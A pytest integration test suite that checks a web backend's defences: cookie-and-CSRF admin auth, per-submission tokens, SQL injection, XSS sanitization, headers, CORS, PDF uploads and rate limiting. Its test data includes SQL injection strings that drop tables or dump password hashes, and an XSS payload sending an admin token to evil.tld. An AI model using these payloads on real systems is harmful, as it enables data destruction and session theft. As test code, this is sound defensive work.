"""
BizCheck Security Test Suite — pytest (integration)

Reflects the post-NULLPOINT auth model:
  - Admin sessions live in a httpOnly cookie + matching CSRF cookie/header.
    Bearer-header auth is NO LONGER accepted on admin routes.
  - Per-submission writes (PATCH /submissions/{id}, /pdf, /send-email,
    /tg/link/{id}) require an `X-Submission-Token` header that matches the
    token returned at POST /submissions create time.

Requires a running backend + DB. Run with:
    cd webdev/backend
    venv/Scripts/python -m pytest tests/test_security.py -v

Pure-logic checks that don't need a server live in test_unit_security.py.
"""
import re
import base64
import pytest

BASE_URL = "http://localhost:4001"
API = "/api_crowe_bizcheck"


def url(path):
    return BASE_URL + path


def _new_session():
    """Single requests.Session shared across calls so cookies persist."""
    import requests
    return requests.Session()


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def admin_session():
    """Returns a logged-in requests.Session (cookies set) + csrf_token string."""
    s = _new_session()
    r = s.post(url(f"{API}/admin/login"), json={"username": "admin", "password": "admin"})
    if r.status_code != 200:
        pytest.skip("Admin login failed — set ADMIN_USERNAME/ADMIN_PASSWORD in env")
    csrf = r.json().get("csrf_token") or s.cookies.get("admin_csrf")
    return s, csrf


@pytest.fixture(scope="module")
def test_submission():
    """A fresh submission. Returns the full record including submission_token."""
    import requests
    r = requests.post(url(f"{API}/submissions"), json={
        "first_name": "SecurityTest",
        "last_name": "User",
        "email": "sectest@bizzcheck.test",
        "consent": True,
    })
    assert r.status_code == 201
    sub = r.json()["submission"]
    assert sub.get("submission_token"), "POST /submissions must return submission_token"
    return sub


# ---------------------------------------------------------------------------
# A. Admin Authentication & Authorization
# ---------------------------------------------------------------------------

class TestAdminAuth:

    def test_admin_invalid_credentials(self):
        import requests
        r = requests.post(url(f"{API}/admin/login"), json={"username": "admin", "password": "wrongpass"})
        assert r.status_code == 401

    def test_admin_login_returns_csrf_no_jwt_in_body(self):
        """Login body must NOT carry the JWT — it goes in a httpOnly cookie."""
        import requests
        s = _new_session()
        r = s.post(url(f"{API}/admin/login"), json={"username": "admin", "password": "admin"})
        if r.status_code != 200:
            pytest.skip("Admin login failed")
        body = r.json()
        assert body.get("ok") is True
        assert "csrf_token" in body
        # The legacy `token` key MUST be gone — it would mean the JWT is JS-readable.
        assert "token" not in body
        assert s.cookies.get("admin_session"), "admin_session cookie must be set"
        assert s.cookies.get("admin_csrf"), "admin_csrf cookie must be set"

    def test_admin_endpoints_no_cookie_returns_401(self):
        import requests
        for method, path in [
            ("GET", f"{API}/submissions"),
            ("GET", f"{API}/admin/stats"),
            ("GET", f"{API}/admin/users"),
        ]:
            r = requests.request(method, url(path))
            assert r.status_code == 401, f"{method} {path} got {r.status_code}"

    def test_bearer_header_no_longer_accepted(self):
        """The old Bearer flow is dead — only the cookie path is honored."""
        import requests
        # Even a syntactically-valid-looking JWT in the header must fail because
        # the middleware doesn't read headers anymore.
        fake = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake"
        r = requests.get(url(f"{API}/admin/stats"), headers={"Authorization": f"Bearer {fake}"})
        assert r.status_code == 401

    def test_admin_get_works_with_cookie_no_csrf_needed(self, admin_session):
        s, _ = admin_session
        r = s.get(url(f"{API}/admin/stats"))
        assert r.status_code == 200

    def test_admin_post_without_csrf_returns_403(self, admin_session):
        s, _ = admin_session
        # Try a destructive admin action with the cookie but no CSRF header.
        r = s.delete(url(f"{API}/admin/tests/999999"))
        assert r.status_code == 403
        assert "CSRF" in (r.json().get("error", "") or "")

    def test_admin_post_with_csrf_passes_auth(self, admin_session):
        """CSRF header present → passes the auth gate (route may still 404)."""
        s, csrf = admin_session
        r = s.delete(
            url(f"{API}/admin/tests/999999"),
            headers={"X-CSRF-Token": csrf},
        )
        # 404 (test not found) is fine; 403 would mean CSRF blocked us.
        assert r.status_code != 403

    def test_admin_post_with_mismatched_csrf_returns_403(self, admin_session):
        s, _ = admin_session
        r = s.delete(
            url(f"{API}/admin/tests/999999"),
            headers={"X-CSRF-Token": "wrong-value"},
        )
        assert r.status_code == 403

    def test_logout_clears_cookies(self):
        import requests
        s = _new_session()
        r = s.post(url(f"{API}/admin/login"), json={"username": "admin", "password": "admin"})
        if r.status_code != 200:
            pytest.skip("Admin login failed")
        csrf = r.json()["csrf_token"]
        r = s.post(url(f"{API}/admin/logout"), headers={"X-CSRF-Token": csrf})
        assert r.status_code == 200
        # Session cookie should be unset
        r = s.get(url(f"{API}/admin/stats"))
        assert r.status_code == 401


# ---------------------------------------------------------------------------
# B. Submission token gate (BOLA / Mass-Assignment fix)
# ---------------------------------------------------------------------------

class TestSubmissionTokenGate:

    def test_patch_without_token_returns_401(self, test_submission):
        import requests
        r = requests.patch(
            url(f"{API}/submissions/{test_submission['id']}"),
            json={"status": "completed"},
        )
        assert r.status_code == 401

    def test_patch_with_wrong_token_returns_403(self, test_submission):
        import requests
        r = requests.patch(
            url(f"{API}/submissions/{test_submission['id']}"),
            json={"status": "completed"},
            headers={"X-Submission-Token": "definitely-not-the-token"},
        )
        assert r.status_code == 403

    def test_patch_with_token_from_other_submission_returns_403(self, test_submission):
        """Token for sub A must NOT work on sub B (the BOLA fix)."""
        import requests
        r = requests.post(url(f"{API}/submissions"), json={"consent": False})
        assert r.status_code == 201
        other = r.json()["submission"]
        r = requests.patch(
            url(f"{API}/submissions/{test_submission['id']}"),
            json={"status": "completed"},
            headers={"X-Submission-Token": other["submission_token"]},
        )
        assert r.status_code == 403

    def test_patch_with_correct_token_succeeds(self, test_submission):
        import requests
        r = requests.patch(
            url(f"{API}/submissions/{test_submission['id']}"),
            json={"language": "uk"},
            headers={"X-Submission-Token": test_submission["submission_token"]},
        )
        assert r.status_code == 200

    def test_patch_drops_unknown_fields_even_with_token(self, test_submission):
        """Mass-assignment guard: even with a valid token, only allowed fields land."""
        import requests
        r = requests.patch(
            url(f"{API}/submissions/{test_submission['id']}"),
            json={
                "language": "uk",
                # All of these should be silently dropped by the whitelist.
                "tg_token": "stolen",
                "id": 99999,
                "is_paid": True,
                "submission_token": "attacker-chosen",
            },
            headers={"X-Submission-Token": test_submission["submission_token"]},
        )
        assert r.status_code == 200
        sub = r.json()["submission"]
        assert sub["id"] == test_submission["id"]  # id not overwritten

    def test_pdf_upload_requires_token(self, test_submission):
        import requests
        r = requests.post(
            url(f"{API}/submissions/{test_submission['id']}/pdf"),
            json={"pdf": "data"},
        )
        assert r.status_code == 401

    def test_send_email_requires_token(self, test_submission):
        import requests
        r = requests.post(url(f"{API}/submissions/{test_submission['id']}/send-email"))
        assert r.status_code == 401

    def test_tg_link_requires_token(self, test_submission):
        """The IDOR fix on /tg/link/{sub_id}."""
        import requests
        r = requests.post(url(f"{API}/tg/link/{test_submission['id']}"))
        assert r.status_code == 401


# ---------------------------------------------------------------------------
# C. SQL Injection
# ---------------------------------------------------------------------------

class TestSQLInjection:

    SQL_PAYLOADS = [
        "'; DROP TABLE submissions; --",
        "' OR '1'='1",
        "' UNION SELECT username, password_hash FROM users--",
        "1; SELECT pg_sleep(5)--",
    ]

    def test_submission_fields_safe(self):
        import requests
        for payload in self.SQL_PAYLOADS:
            r = requests.post(url(f"{API}/submissions"), json={
                "first_name": payload[:50],
                "last_name": "SQLTest",
                "email": "sql@test.com",
                "consent": True,
            })
            assert r.status_code != 500

    def test_admin_login_sql_injection(self):
        import requests
        for payload in self.SQL_PAYLOADS:
            r = requests.post(url(f"{API}/admin/login"), json={"username": payload, "password": "x"})
            assert r.status_code in (400, 401, 429)

    def test_submission_id_integer_enforced(self):
        import requests
        for bad_id in ["1 OR 1=1", "1; DROP TABLE submissions", "'1'"]:
            r = requests.get(url(f"{API}/submissions/{bad_id}"))
            assert r.status_code == 404


# ---------------------------------------------------------------------------
# D. Input Validation & XSS sanitization
# ---------------------------------------------------------------------------

class TestInputValidation:

    def test_partial_submissions_accepted(self):
        import requests
        for body in [{}, {"email": "a@b.com"}, {"first_name": "A", "last_name": "B"}]:
            r = requests.post(url(f"{API}/submissions"), json=body)
            assert r.status_code == 201

    def test_invalid_emails_rejected(self):
        import requests
        for email in ["notanemail", "@nodomain.com", "a@", "x" * 300 + "@b.com"]:
            r = requests.post(url(f"{API}/submissions"), json={
                "first_name": "A", "email": email, "consent": True,
            })
            assert r.status_code == 400

    def test_xss_payload_stripped_at_create(self):
        """The exact NULLPOINT payload must not survive sanitization."""
        import requests
        payload = "<svg/onload=location='//evil.tld?t='+localStorage.admin_token>"
        r = requests.post(url(f"{API}/submissions"), json={
            "last_name": payload,
            "consent": True,
        })
        assert r.status_code == 201
        # Sanitization happens server-side; admin GET would show clean text.
        # We can't read the row without admin auth here; just assert no 500.

    def test_oversized_name_does_not_crash(self):
        import requests
        r = requests.post(url(f"{API}/submissions"), json={
            "first_name": "A" * 10000,
            "consent": True,
        })
        assert r.status_code in (201, 400)


# ---------------------------------------------------------------------------
# E. Security Headers / CORS
# ---------------------------------------------------------------------------

class TestSecurityHeaders:

    def _headers(self):
        import requests
        return requests.get(url("/api/health")).headers

    def test_x_content_type_options(self):
        assert self._headers().get("X-Content-Type-Options") == "nosniff"

    def test_frame_ancestors_via_csp(self):
        # X-Frame-Options: DENY a fost eliminat ca Event Setup Tool de la Meta să poată
        # afișa site-ul în iframe; framing-ul e controlat acum de frame-ancestors din CSP.
        headers = self._headers()
        assert "X-Frame-Options" not in headers
        assert "frame-ancestors" in headers.get("Content-Security-Policy", "")

    def test_referrer_policy(self):
        assert self._headers().get("Referrer-Policy") is not None

    def test_permissions_policy(self):
        assert self._headers().get("Permissions-Policy") is not None

    def test_cors_not_wildcard(self):
        import requests
        r = requests.options(url(f"{API}/submissions"), headers={
            "Origin": "http://evil.com",
            "Access-Control-Request-Method": "POST",
        })
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        assert acao != "*", "CORS wildcard breaks credential cookies AND is a security risk"


# ---------------------------------------------------------------------------
# F. PDF Upload Security
# ---------------------------------------------------------------------------

class TestPDFSecurity:

    def _make_submission(self, email):
        import requests
        r = requests.post(url(f"{API}/submissions"), json={"email": email, "consent": True})
        assert r.status_code == 201
        return r.json()["submission"]

    def test_non_pdf_rejected(self):
        import requests
        sub = self._make_submission("nonpdf@test.com")
        fake = base64.b64encode(b"This is not a PDF file").decode()
        r = requests.post(
            url(f"{API}/submissions/{sub['id']}/pdf"),
            json={"pdf": fake},
            headers={"X-Submission-Token": sub["submission_token"]},
        )
        assert r.status_code == 400

    def test_invalid_base64_rejected(self):
        import requests
        sub = self._make_submission("invalidb64@test.com")
        r = requests.post(
            url(f"{API}/submissions/{sub['id']}/pdf"),
            json={"pdf": "!!!not_b64!!!"},
            headers={"X-Submission-Token": sub["submission_token"]},
        )
        assert r.status_code == 400

    def test_missing_pdf_data_rejected(self):
        import requests
        sub = self._make_submission("nopdf@test.com")
        r = requests.post(
            url(f"{API}/submissions/{sub['id']}/pdf"),
            json={},
            headers={"X-Submission-Token": sub["submission_token"]},
        )
        assert r.status_code == 400


# ---------------------------------------------------------------------------
# G. IDOR
# ---------------------------------------------------------------------------

class TestIDOR:

    def test_submission_get_requires_admin(self, test_submission):
        import requests
        r = requests.get(url(f"{API}/submissions/{test_submission['id']}"))
        assert r.status_code == 401

    def test_submission_delete_requires_admin(self, test_submission):
        import requests
        r = requests.delete(url(f"{API}/submissions/{test_submission['id']}"))
        assert r.status_code == 401

    def test_submission_pdf_download_requires_admin(self, test_submission):
        import requests
        r = requests.get(url(f"{API}/submissions/{test_submission['id']}/pdf"))
        assert r.status_code == 401

    def test_all_submissions_requires_admin(self):
        import requests
        r = requests.get(url(f"{API}/submissions"))
        assert r.status_code == 401


# ---------------------------------------------------------------------------
# H. Sensitive Data Exposure
# ---------------------------------------------------------------------------

class TestSensitiveDataExposure:

    def test_404_no_stacktrace(self):
        import requests
        r = requests.get(url("/api/nonexistent_endpoint_xyz"))
        assert "Traceback" not in r.text


# ---------------------------------------------------------------------------
# I. Rate Limiting
# ---------------------------------------------------------------------------

class TestRateLimiting:

    def test_admin_login_rate_limited(self):
        import requests
        statuses = set()
        for _ in range(10):
            r = requests.post(url(f"{API}/admin/login"), json={
                "username": "ratelimitattacker",
                "password": "wrongpassword",
            })
            statuses.add(r.status_code)
        assert all(s in (400, 401, 429) for s in statuses)

    def test_xff_spoof_does_not_bypass_rate_limit(self):
        """nginx overwrites XFF with the real client IP, so spoofing is moot.
        We probe by sending an obviously fake XFF and checking we still hit 429."""
        import requests
        statuses = []
        for i in range(15):
            r = requests.post(
                url(f"{API}/admin/login"),
                json={"username": f"x{i}", "password": "y"},
                headers={"X-Forwarded-For": f"1.2.3.{i}"},
            )
            statuses.append(r.status_code)
        assert 429 in statuses, "Spoofed XFF must NOT let us bypass per-IP limits"

    def test_large_request_body_rejected(self):
        import requests
        large = "x" * (26 * 1024 * 1024)
        r = requests.post(
            url(f"{API}/submissions"),
            data=large,
            headers={"Content-Type": "application/json"},
        )
        assert r.status_code in (400, 413, 429)
